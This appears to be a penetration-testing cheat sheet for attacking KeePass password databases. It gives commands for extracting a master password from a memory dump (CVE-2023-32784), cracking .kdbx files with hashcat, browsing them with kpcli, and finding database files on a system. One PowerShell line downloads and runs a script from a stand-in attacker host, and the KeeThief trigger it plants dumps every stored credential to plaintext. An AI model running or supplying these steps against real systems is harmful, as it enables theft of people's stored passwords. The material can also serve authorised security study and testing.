# KeePass Attacks

## CVE-2023-32784 - Memory Dump Master Password Extraction

**Affects:** KeePass 2.x before 2.54

Extract master password from KeePass memory dump or crash dump file (.dmp).

### Tools

```bash
# Rust version (fast)
git clone https://github.com/JorianWoltjer/keepass-dump-extractor
cd keepass-dump-extractor && cargo build --release

# Python version
git clone https://github.com/matro7sh/keepass-dump-masterkey
```

### Exploitation

```bash
# Extract password (may have first char missing)
./keepass-dump-extractor KeePassDumpFull.dmp

# Output shows partial password with bullets for unknown chars
●ødgrød med fløde

# Generate wordlist for missing first char
./keepass-dump-extractor -f all KeePassDumpFull.dmp > wordlist.txt

# Python version
python3 poc.py KeePassDumpFull.dmp
```

### Cracking KeePass Database

```bash
# Convert .kdbx to hashcat format
keepass2john passcodes.kdbx > keepass.hash

# Remove filename prefix (passcodes:)
sed -i 's/^[^:]*://' keepass.hash

# Crack with recovered password wordlist
hashcat -m 13400 -a 0 keepass.hash wordlist.txt

# Or brute-force missing chars
hashcat -m 13400 -a 3 keepass.hash "?aødgrød?amed?afløde"
```

---

## kpcli - KeePass CLI

Access KeePass database from command line.

```bash
# Install
apt install kpcli

# Open database
kpcli --kdb=passcodes.kdbx
# Enter master password when prompted

# Navigation
kpcli:/> ls                      # List groups
kpcli:/> cd passcodes/Network    # Change directory
kpcli:/> show -f 0               # Show entry with password (-f shows password)
```

### Useful Commands

| Command | Description |
|---------|-------------|
| `ls` | List entries/groups |
| `cd <group>` | Change to group |
| `show <entry>` | Show entry (no password) |
| `show -f <entry>` | Show entry with password |
| `find <term>` | Search entries |
| `quit` | Exit |

---

## KeeThief Config Trigger (Windows)

Dumps entire database when user logs into KeePass.

```powershell
# Download
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER:8080/KeePassConfig.ps1')

# Add trigger
Add-KeePassConfigTrigger -Path $env:appdata\KeePass\KeePass.config.xml -Verbose -ExportPath C:\Windows\Tasks
```

Output CSV format:
```
"Account","Login Name","Password","Web Site","Comments"
"Admin Account","admin","P@ssw0rd","",""
```

---

## Common KeePass Paths

**Windows:**
```
%APPDATA%\KeePass\
C:\Users\<user>\Documents\*.kdbx
C:\Users\<user>\Desktop\*.kdbx
```

**Linux:**
```
~/.keepass/
~/*.kdbx
find / -name "*.kdbx" 2>/dev/null
```

**Memory dumps:**
```
*.dmp
KeePassDumpFull.dmp
```
